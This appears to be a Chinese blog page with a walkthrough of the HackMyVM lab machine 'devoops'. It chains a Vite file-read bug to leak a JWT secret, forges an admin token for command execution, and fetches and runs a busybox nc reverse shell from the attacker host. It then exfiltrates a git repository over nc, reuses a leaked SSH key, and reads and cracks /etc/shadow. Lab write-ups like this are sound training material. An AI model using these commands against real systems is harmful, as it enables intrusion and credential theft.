@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# **一、信息收集**
+
+首先，使用`arp-scan`工具对当前局域网进行扫描，以发现存活主机并确定靶机的IP地址。">
+<meta property="og:title" content="hmv_devoops">
+<meta property="og:description" content="# **一、信息收集**
+
+首先，使用`arp-scan`工具对当前局域网进行扫描，以发现存活主机并确定靶机的IP地址。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/hmv_devoops.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>hmv_devoops</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_devoops</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/232" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1><strong>一、信息收集</strong></h1>
+<p>首先，使用<code class="notranslate">arp-scan</code>工具对当前局域网进行扫描，以发现存活主机并确定靶机的IP地址。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l                               
+[sudo] kali 的密码：
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+...
+192.168.205.149 08:00:27:df:47:90       PCS Systemtechnik GmbH
+...</pre></div>
+<p>发现目标主机IP为 <code class="notranslate">192.168.205.149</code>。</p>
+<p>接着，使用<code class="notranslate">nmap</code>对目标主机进行全端口扫描，以探测其开放的服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.149
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 07:29 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.205.149
+Host is up (0.00020s latency).
+Not shown: 65535 closed tcp ports (reset)
+PORT     STATE SERVICE
+3000/tcp open  ppp
+MAC Address: 08:00:27:DF:47:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.43 seconds</pre></div>
+<p>扫描结果显示，目标主机仅开放了 3000 端口。</p>
+<p>使用<code class="notranslate">curl</code>访问该端口提供的Web服务，查看页面源代码。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.149:3000                                                               
+<span class="pl-k">&lt;</span><span class="pl-k">!</span>doctype html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>html lang=<span class="pl-s"><span class="pl-pds">"</span>en<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>head<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>script type=<span class="pl-s"><span class="pl-pds">"</span>module<span class="pl-pds">"</span></span> src=<span class="pl-s"><span class="pl-pds">"</span>/@vite/client<span class="pl-pds">"</span></span>&gt;&lt;/script<span class="pl-k">&gt;</span>
+...
+    <span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>Vite + Vue<span class="pl-k">&lt;</span>/title<span class="pl-k">&gt;</span>
+...
+    <span class="pl-k">&lt;</span>script type=<span class="pl-s"><span class="pl-pds">"</span>module<span class="pl-pds">"</span></span> src=<span class="pl-s"><span class="pl-pds">"</span>/src/main.js<span class="pl-pds">"</span></span>&gt;&lt;/script<span class="pl-k">&gt;</span>
+...
+<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span></pre></div>
+<p>从返回的HTML内容可以判断，这是一个基于 Vite 和 Vue 构建的前端项目。Vite 是一个现代化的前端构建工具，其在开发模式下会提供一个开发服务器。</p>
+<h1><strong>二、漏洞发现与利用</strong></h1>
+<p>尝试读取该Vite项目的配置文件<code class="notranslate">vite.config.js</code>，以了解其后端代理和安全设置。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.149:3000/vite.config.js 
+import { defineConfig } from <span class="pl-s"><span class="pl-pds">"</span>/node_modules/.vite/deps/vite.js?v=4e07dcb1<span class="pl-pds">"</span></span>
+...
+<span class="pl-k">export</span> default defineConfig({
+  plugins: [vue()],
+  server: {
+    proxy: {
+      <span class="pl-s"><span class="pl-pds">'</span>/sign<span class="pl-pds">'</span></span>: {
+        target: <span class="pl-s"><span class="pl-pds">'</span>http://localhost:3001<span class="pl-pds">'</span></span>,
+        changeOrigin: true,
+        rewrite: (path) =<span class="pl-k">&gt;</span> path.replace(/^<span class="pl-cce">\/</span>sign/, <span class="pl-s"><span class="pl-pds">'</span>/api/sign<span class="pl-pds">'</span></span>)
+      },
+      <span class="pl-s"><span class="pl-pds">'</span>/execute<span class="pl-pds">'</span></span>: {
+        target: <span class="pl-s"><span class="pl-pds">'</span>http://localhost:3001<span class="pl-pds">'</span></span>,
+        changeOrigin: true,
+        rewrite: (path) =<span class="pl-k">&gt;</span> path.replace(/^<span class="pl-cce">\/</span>execute/, <span class="pl-s"><span class="pl-pds">'</span>/api/execute<span class="pl-pds">'</span></span>)
+      }
+    },
+    fs: {
+      deny: [<span class="pl-s"><span class="pl-pds">'</span>.env<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>.env.*<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>*.{crt,pem}<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>**/.git/**<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>package.json<span class="pl-pds">'</span></span>],
+    }
+  },
+})</pre></div>
+<p>配置文件暴露了两个API代理路径 <code class="notranslate">/sign</code> 和 <code class="notranslate">/execute</code>，它们都被转发到本地的 <code class="notranslate">http://localhost:3001</code> 服务。同时，<code class="notranslate">fs.deny</code> 配置项试图阻止对 <code class="notranslate">.env</code> 等敏感文件的直接访问。</p>
+<p>继续读取后端服务的主逻辑文件 <code class="notranslate">server.js</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.149:3000/server.js
+...
+app.get(<span class="pl-s"><span class="pl-pds">'</span>/api/sign<span class="pl-pds">'</span></span>, (req, res) =<span class="pl-k">&gt;</span> {
+    <span class="pl-k">return</span> res.json({
+        <span class="pl-s"><span class="pl-pds">'</span>status<span class="pl-pds">'</span></span>: <span class="pl-s"><span class="pl-pds">'</span>signed<span class="pl-pds">'</span></span>,
+        <span class="pl-s"><span class="pl-pds">'</span>data<span class="pl-pds">'</span></span>: jwt.sign({
+            uid: -1,
+            role: <span class="pl-s"><span class="pl-pds">'</span>guest<span class="pl-pds">'</span></span>,
+        }, process.env.JWT_SECRET, { expiresIn: <span class="pl-s"><span class="pl-pds">'</span>1800s<span class="pl-pds">'</span></span> }),
+    })<span class="pl-k">;</span>
+})<span class="pl-k">;</span>
+
+app.get(<span class="pl-s"><span class="pl-pds">'</span>/api/execute<span class="pl-pds">'</span></span>, async (req, res) =<span class="pl-k">&gt;</span> {
+...
+    try {
+        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET)<span class="pl-k">;</span>
+        <span class="pl-k">if</span> (payload.role <span class="pl-k">!</span>== <span class="pl-s"><span class="pl-pds">'</span>admin<span class="pl-pds">'</span></span>) {
+...
+    const <span class="pl-c1">command</span> = req.query.cmd<span class="pl-k">;</span>
+
+    const is_command_safe = is_safe_command(command)<span class="pl-k">;</span>
+...
+})<span class="pl-k">;</span>
+...</pre></div>
+<p>代码审计发现：</p>
+<ol>
+<li><code class="notranslate">/api/sign</code> 接口使用 <code class="notranslate">process.env.JWT_SECRET</code> 作为密钥，签发一个角色为 <code class="notranslate">guest</code> 的JWT。</li>
+<li><code class="notranslate">/api/execute</code> 接口要求请求头中包含有效的JWT，并验证其 <code class="notranslate">role</code> 是否为 <code class="notranslate">admin</code>，之后会执行 <code class="notranslate">cmd</code> 参数传入的命令。</li>
+</ol>
+<p>尽管 <code class="notranslate">vite.config.js</code> 中配置了 <code class="notranslate">fs.deny</code>，但 Vite 在某些版本中存在目录遍历和文件读取漏洞（此靶机环境中为<strong><a title="CVE-2025-30208" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-x574-m823-4x7w/hovercard" href="https://github.com/advisories/GHSA-x574-m823-4x7w">CVE-2025-30208</a></strong>），可以绕过该限制。通过特定payload可以读取到 <code class="notranslate">.env</code> 文件内容。</p>
+<blockquote>
+<p>[Tip]</p>
+<p><a href="https://github.com/ThumpBo/CVE-2025-30208-EXP">https://github.com/ThumpBo/CVE-2025-30208-EXP</a></p>
+</blockquote>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl -s <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.149:3000/opt/node/.env?import&amp;raw??<span class="pl-pds">'</span></span>
+<span class="pl-k">export</span> default <span class="pl-s"><span class="pl-pds">"</span>JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&amp;,&lt;,&gt;,ls,cat,pwd,head,tail,grep,xxd'\n<span class="pl-pds">"</span></span></pre></div>
+<p>成功获取到 <code class="notranslate">JWT_SECRET</code>：<code class="notranslate">2942szKG7Ev83aDviugAa6rFpKixZzZz</code>，以及命令执行的黑名单 <code class="notranslate">COMMAND_FILTER</code>。</p>
+<p>利用获取到的 <code class="notranslate">JWT_SECRET</code>，我们可以伪造一个角色为 <code class="notranslate">admin</code> 的JWT。可以访问 [<a href="https://jwt.cagdastunca.com/" rel="nofollow">jwt.cagdastunca.com</a>](<a href="https://jwt.cagdastunca.com/" rel="nofollow">https://jwt.cagdastunca.com/</a>) 或其他JWT工具来完成此操作。</p>
+<p><strong>伪造的Payload:</strong></p>
+<div class="highlight highlight-source-json"><pre class="notranslate">{
+  <span class="pl-ent">"uid"</span>: <span class="pl-c1">-1</span>,
+  <span class="pl-ent">"role"</span>: <span class="pl-s"><span class="pl-pds">"</span>admin<span class="pl-pds">"</span></span>,
+  <span class="pl-ent">"iat"</span>: <span class="pl-c1">1756035331</span>,
+  <span class="pl-ent">"exp"</span>: <span class="pl-c1">1756037131</span>
+}</pre></div>
+<p><strong>生成的Admin Token:</strong><br>
+<code class="notranslate">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTYwMzUzMzEsImV4cCI6MTc1NjAzNzEzMX0.meJBbQUW_wJiQBM7FBtF6IIdP0SJrD5Z_tXJoRr6yi0</code></p>
+<p>使用伪造的Token尝试执行 <code class="notranslate">id</code> 命令，验证远程代码执行（RCE）是否成功。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ADMIN_TOKEN=<span class="pl-s"><span class="pl-pds">"</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTYwMzUzMzEsImV4cCI6MTc1NjAzNzEzMX0.meJBbQUW_wJiQBM7FBtF6IIdP0SJrD5Z_tXJoRr6yi0<span class="pl-pds">"</span></span>
+      
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl -g -H <span class="pl-s"><span class="pl-pds">"</span>Authorization: Bearer <span class="pl-smi">$ADMIN_TOKEN</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.149:3000/execute?cmd=id<span class="pl-pds">"</span></span>
+{<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>executed<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>data<span class="pl-pds">"</span></span>:{<span class="pl-s"><span class="pl-pds">"</span>stdout<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>uid=1000(runner) gid=1000(runner) groups=1000(runner)\n<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>stderr<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>}}</pre></div>
+<p>命令成功执行，当前用户为 <code class="notranslate">runner</code>。</p>
+<h1><strong>三、获取反弹Shell</strong></h1>
+<p>为了获得一个交互式的Shell，我们准备进行反弹Shell操作。通过执行 <code class="notranslate">busybox</code> 命令，可以查看目标系统支持的工具。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl -g -H <span class="pl-s"><span class="pl-pds">"</span>Authorization: Bearer <span class="pl-smi">$ADMIN_TOKEN</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.149:3000/execute?cmd=busybox<span class="pl-pds">"</span></span>
+{<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>executed<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>data<span class="pl-pds">"</span></span>:{<span class="pl-s"><span class="pl-pds">"</span>stdout<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>BusyBox v1.37.0 ... \n ... \n\t ... nc, netstat, ... wget, ...\n ...<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>stderr<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>}}</pre></div>
+<p>目标系统存在 <code class="notranslate">busybox nc</code> 和 <code class="notranslate">wget</code>，且均未被<code class="notranslate">COMMAND_FILTER</code>过滤。可以利用这些工具来获取反弹Shell。</p>
+<ol>
+<li>
+<p>在本地Kali攻击机上创建一个包含反弹Shell命令的脚本 <code class="notranslate">sss</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cat sss
+busybox nc 192.168.205.128 8888 -e /bin/ash</pre></div>
+</li>
+<li>
+<p>在Kali上开启一个临时的HTTP服务，用于靶机下载脚本。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre></div>
+</li>
+<li>
+<p>在Kali上使用 <code class="notranslate">nc</code> 监听8888端口，准备接收反弹Shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888</pre></div>
+</li>
+<li>
+<p>通过RCE漏洞，执行一串命令：下载脚本(<code class="notranslate">wget</code>)，赋予执行权限(<code class="notranslate">chmod</code>)，然后执行脚本。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl -g -H <span class="pl-s"><span class="pl-pds">"</span>Authorization: Bearer <span class="pl-smi">$ADMIN_TOKEN</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.149:3000/execute?cmd=wget%20192%2E168%2E205%2E128%2Fsss%0Achmod%20%2Bx%20%2E%2Fsss%0A%2E%2Fsss<span class="pl-pds">'</span></span></pre></div>
+</li>
+</ol>
+<p>成功接收到反弹Shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888                     
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 45275
+id
+uid=1000(runner) gid=1000(runner) groups=1000(runner)</pre></div>
+<h1><strong>四、横向移动</strong></h1>
+<p>在获得的Shell中进行信息收集，发现 <code class="notranslate">/opt</code> 目录下存在一个 <code class="notranslate">gitea</code> 目录，其中包含一个名为 <code class="notranslate">node.git</code> 的git仓库。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">...
+<span class="pl-c1">cd</span> /opt/gitea/git/hana
+ls -al
+total 12
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 <span class="pl-c1">.</span>
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 ..
+drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 node.git</pre></div>
+<p>为了深入分析，我们将整个 <code class="notranslate">node.git</code> 仓库打包并传回Kali攻击机。</p>
+<ol>
+<li>
+<p>在靶机上，将 <code class="notranslate">node.git</code> 目录打包。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">busybox tar -cf /tmp/1.tar node.git</pre></div>
+</li>
+<li>
+<p>在Kali上监听1234端口，并将接收到的数据保存为 <code class="notranslate">1.tar</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 1234 <span class="pl-k">&gt;</span> 1.tar</pre></div>
+</li>
+<li>
+<p>在靶机上，使用 <code class="notranslate">nc</code> 将打包好的文件发送到Kali。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat 1.tar<span class="pl-k">|</span>busybox nc 192.168.205.128 1234</pre></div>
+</li>
+</ol>
+<p>文件传输完成后，在Kali上解压并分析git仓库的历史记录。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ tar -xf 1.tar
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ <span class="pl-c1">cd</span> node.git 
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/node.git]
+└─$ git log -p</pre></div>
+<p><code class="notranslate">git log -p</code> 的输出显示了一个非常关键的提交历史：开发者曾错误地将一个SSH私钥 <code class="notranslate">id_ed25519</code> 提交到仓库，随后又在下一次提交中将其删除。</p>
+<div class="highlight highlight-source-diff"><pre class="notranslate">commit 1994a70bbd080c633ac85a339fd85a8635c63893 (HEAD -&gt; main)
+Author: azwhikaru &lt;37921907+azwhikaru@users.noreply.github.com&gt;
+Date:   Mon Apr 21 14:36:12 2025 +0800
+
+    del: oops!
+
+<span class="pl-c1">diff --git a/id_ed25519 b/id_ed25519</span>
+deleted file mode 100644
+index a2626a4..0000000
+<span class="pl-md">--- a/id_ed25519</span>
+<span class="pl-mi1">+++ /dev/null</span>
+<span class="pl-mdr">@@ -1,7 +0,0 @@</span>
+<span class="pl-md"><span class="pl-md">-</span>-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="pl-md"><span class="pl-md">-</span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span>
+<span class="pl-md"><span class="pl-md">-</span>QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN</span>
+<span class="pl-md"><span class="pl-md">-</span>5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg</span>
+<span class="pl-md"><span class="pl-md">-</span>AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z</span>
+<span class="pl-md"><span class="pl-md">-</span>WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==</span>
+<span class="pl-md"><span class="pl-md">-</span>-----END OPENSSH PRIVATE KEY-----</span></pre></div>
+<p>从diff信息中提取私钥内容并还原。在反弹Shell中，通过<code class="notranslate">netstat -lntup</code>发现SSH服务仅监听在<code class="notranslate">127.0.0.1:22</code>，无法从外部直接访问。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">netstat -lntup
+Active Internet connections (only servers)
+...          
+tcp        0      0 127.0.0.1:22            0.0.0.0:<span class="pl-k">*</span>               LISTEN      -                   
+...</pre></div>
+<p>为了能够使用获取到的私钥登录，需要在靶机上进行端口转发，将内部的SSH服务暴露给攻击机。这里使用<code class="notranslate">socat</code>将2222端口的流量转发至127.0.0.1:22。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:22 <span class="pl-k">&amp;</span></pre></div>
+<p>现在，可以使用私钥通过2222端口SSH登录<code class="notranslate">hana</code>用户。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/tmp]
+└─$ <span class="pl-c"><span class="pl-c">#</span> ... (还原私钥到 /tmp/id_rsa) ...</span>
+                                                                                   ┌──(kali㉿kali)-[/tmp]
+└─$ sed -i <span class="pl-s"><span class="pl-pds">'</span>s/^-//<span class="pl-pds">'</span></span> id_rsa                                                                                          
+┌──(kali㉿kali)-[/tmp]
+└─$ chmod 600 id_rsa
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/tmp]
+└─$ ssh hana@192.168.205.149 -p 2222 -i /tmp/id_rsa
+...
+devoops:<span class="pl-k">~</span>$ id
+uid=1001(hana) gid=100(users) groups=100(users),100(users)</pre></div>
+<p>成功以 <code class="notranslate">hana</code> 用户身份登录。</p>
+<h1><strong>五、权限提升</strong></h1>
+<p>登录 <code class="notranslate">hana</code> 用户后，检查其 <code class="notranslate">sudo</code> 权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">devoops:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> hana on devoops:
+...
+User hana may run the following commands on devoops:
+    (root) NOPASSWD: /sbin/arp</pre></div>
+<p>结果显示 <code class="notranslate">hana</code> 用户可以无密码以root权限执行 <code class="notranslate">/sbin/arp</code> 命令。这是一个已知的可被利用于提权的配置。查询 [<a href="https://gtfobins.github.io/gtfobins/arp/#sudo" rel="nofollow">GTFOBins</a>](<a href="https://gtfobins.github.io/gtfobins/arp/#sudo" rel="nofollow">https://gtfobins.github.io/gtfobins/arp/#sudo</a>) 可知，<code class="notranslate">arp</code> 命令的 <code class="notranslate">-f</code> 参数可以加载一个文件，如果指定的文件不存在或格式错误，它会尝试逐行读取并显示文件内容，从而实现任意文件读取。</p>
+<p>利用此特性读取 <code class="notranslate">/etc/shadow</code> 文件，获取root用户的密码哈希。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">devoops:<span class="pl-k">~</span>$ sudo arp -v -f /etc/shadow
+<span class="pl-k">&gt;&gt;</span> root:<span class="pl-smi">$6</span><span class="pl-smi">$FGoCakO3</span>/TPFyfOf<span class="pl-smi">$6</span>eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
+....</pre></div>
+<p>将获取到的root用户哈希保存到本地文件，并使用 <code class="notranslate">john</code> 和字典进行破解。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> <span class="pl-c1">hash</span>
+                          
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ john --wordlist=xato-net-10-million-passwords.txt <span class="pl-c1">hash</span>
+...
+eris             (root)     
+...
+Session completed. </pre></div>
+<p>成功破解出root密码为 <code class="notranslate">eris</code>。</p>
+<h1><strong>六、获取Flag</strong></h1>
+<p>使用破解出的密码切换到 <code class="notranslate">root</code> 用户，提权完成。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">devoops:<span class="pl-k">~</span>$ su -
+Password: 
+devoops:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span></span></pre></div>
+<p>最后，在 <code class="notranslate">root</code> 和 <code class="notranslate">hana</code> 的家目录中找到并读取flag文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">devoops:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /root/R007.7x7oOoOoOoOoOoO /home/hana/user.flag </span>
+flag{a834296543f4c2990909ce1c56becfba}
+flag{03d0e150ae9fc686a827b41e1969d497}</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 